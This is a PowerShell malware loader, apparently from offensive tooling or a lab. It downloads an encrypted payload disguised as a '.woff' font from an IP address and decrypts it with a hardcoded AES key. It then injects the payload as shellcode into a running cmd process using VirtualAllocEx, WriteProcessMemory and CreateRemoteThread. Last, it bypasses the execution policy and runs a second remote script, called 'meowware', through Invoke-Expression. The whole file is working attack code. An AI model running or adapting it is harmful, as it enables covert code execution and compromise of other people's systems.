$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 
{
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint DesiredAccess, bool bInheritHandle, int ProcessID);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr Process, IntPtr StartAddress, UIntPtr shellcodeSize, uint AllocationType, uint MemProtectConstraint);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr Process, IntPtr StartAddr, byte[] Shellcode, uint shellSize, out UIntPtr BytesWritten);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr Process, IntPtr threadAttrib, uint stackSize, IntPtr shellcodeAddr, IntPtr additionalParams, uint creationFlags, out IntPtr lpThreadId);
}
"@
Add-Type $Win32

# Function for decompressing data
function Decompress 
{
    param 
    (
        [byte[]]$Data, [ValidateSet('deflate9', 'gzip', 'none')] [string]$CompressionAlgorithm
    )

    $deflateStream = $null
    $gzipStream = $null
    $compressedStream = $null
    $decompressedStream = $null

    try
    {
        if ($CompressionAlgorithm -eq 'none') 
        {
            return $Data
        }

        $compressedStream = [System.IO.MemoryStream]::new($Data)
        $decompressedStream = [System.IO.MemoryStream]::new()

        if ($CompressionAlgorithm -eq 'deflate9') 
        {
            $deflateStream = [System.IO.Compression.DeflateStream]::new($compressedStream, [System.IO.Compression.CompressionMode]::Decompress)
            $deflateStream.CopyTo($decompressedStream)
        } 
        elseif ($CompressionAlgorithm -eq 'gzip') 
        {
            $gzipStream = [System.IO.Compression.GZipStream]::new($compressedStream, [System.IO.Compression.CompressionMode]::Decompress)
            $gzipStream.CopyTo($decompressedStream)
        }

        $result = $decompressedStream.ToArray()
        return $result
    }
    catch 
    {
        Write-Error "Decompression failed: $_"
    }
    finally 
    {
        if ($deflateStream) { $deflateStream.Dispose() }
        if ($gzipStream) { $gzipStream.Dispose() }
        if ($compressedStream) { $compressedStream.Dispose() }
        if ($decompressedStream) { $decompressedStream.Dispose() }
    }
}

# Function for AES decryption
function Decrypt 
{
    param ([byte[]]$FullData)

    $key = [System.Text.Encoding]::UTF8.GetBytes('D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT')
    $iv = [System.Text.Encoding]::UTF8.GetBytes('8y/B?E(G+KbPeShV')
    $cipherText = $FullData[16..($FullData.Length - 1)]

    $aesAlg = [System.Security.Cryptography.Aes]::Create()
    $decryptor = $null
    $memoryStream = $null
    $cryptoStream = $null

    try 
    {
        $aesAlg.Key = $key
        $aesAlg.IV = $iv
        $aesAlg.Padding = [System.Security.Cryptography.PaddingMode]::None
        $aesAlg.Mode = [System.Security.Cryptography.CipherMode]::CBC

        $decryptor = $aesAlg.CreateDecryptor()
        $memoryStream = [System.IO.MemoryStream]::new()
        $cryptoStream = [System.Security.Cryptography.CryptoStream]::new($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

        $cryptoStream.Write($cipherText, 0, $cipherText.Length)
        $cryptoStream.FlushFinalBlock()

        $result = $memoryStream.ToArray()
        return $result
    }
    catch 
    {
        Write-Error "Decryption failed: $_"
    }
    finally 
    {
        if ($cryptoStream) { $cryptoStream.Dispose() }
        if ($memoryStream) { $memoryStream.Dispose() }
        if ($decryptor) { $decryptor.Dispose() }
        if ($aesAlg) { $aesAlg.Dispose() }
    }
}


# Download encrypted and compressed data
$encrypted = (New-Object System.Net.WebClient).DownloadData("http://192.168.7.130/rev.woff?x=1279")
if (-not $encrypted) { Exit }

# First decrypt the data
$compressed = Decrypt -FullData $encrypted

# Then decompress the data
$shellcode = Decompress -Data $compressed -CompressionAlgorithm 'deflate9'
$size = [System.UIntPtr]::new($shellcode.Length)

# Display the first 64 bytes of processed data
$hexShellcode = [BitConverter]::ToString($shellcode[0..63]) -replace '-'
Write-Output "First 64 bytes (hex): $hexShellcode"
$textShellcode = [System.Text.Encoding]::UTF8.GetString($shellcode[0..63])
Write-Output "First 64 bytes (text): $textShellcode"

# Get the target process
$targetProcess = Get-Process -Name cmd | Select-Object -First 1
$processId = $targetProcess.Id

# Open target process
$process = [Win32]::OpenProcess(0x001FFFFF, $false, $processId)

# Allocate memory in the target process
$memAddr = [Win32]::VirtualAllocEx($process, [System.IntPtr]::Zero, $size, 0x3000, 0x40)

# Write the shellcode to allocated memory
$writtenBytes = [System.UIntPtr]::Zero
[Win32]::WriteProcessMemory($process, $memAddr, $shellcode, [uint32]$size.ToUInt32(), [ref]$writtenBytes)

# Execute the shellcode
$threadID = [System.IntPtr]::Zero
[Win32]::CreateRemoteThread($process, [System.IntPtr]::Zero, 0, $memAddr, [System.IntPtr]::Zero, 0, [ref]$threadID)

Write-Output "Injection complete."

# Setting Execution Policy for the current process
Set-ExecutionPolicy Bypass -Scope Process -Force

# Download meowware troll script from server
$meowwareUrl = "http://104.38.66.28:8000/meowware.ps1"  # Replace with your actual URL
$meowwareScript = (New-Object System.Net.WebClient).DownloadString($meowwareUrl)

if (-not $meowwareScript) {
    Write-Host "Failed to download Meowware script."
    Exit
}

# Use Invoke-Expression to execute the downloaded script
Invoke-Expression $meowwareScript

# Kill current process so it doesnt potenially hang and become a parent process of meowware
Stop-Process -Id $PID
